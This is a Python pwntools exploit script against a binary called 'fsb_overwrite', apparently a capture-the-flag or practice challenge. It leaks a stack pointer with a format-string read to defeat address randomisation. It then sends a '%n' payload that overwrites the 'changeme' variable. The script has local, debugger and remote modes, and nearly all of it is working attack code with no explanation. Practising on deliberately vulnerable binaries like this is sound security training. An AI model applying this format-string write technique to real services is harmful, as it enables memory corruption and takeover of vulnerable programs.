#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('fsb_overwrite')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+76
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


def init():
    global io

    io = start()


def solve():

    io.sendline(b"|%15$p")
    io.recvuntil(b"|")
    exe.address = int(io.recvline().strip(), 16) - 0x1293
    info("changeme addr: %#x", exe.sym["changeme"])
    
 
    payload = f"%1337c%8$n".encode()
    payload += f"......".encode()
    payload += p64(exe.sym["changeme"])

    print(len(payload))
    io.sendline(payload)

    io.interactive()



def main():
    
    init()
    solve()



if __name__ == '__main__':
    main()

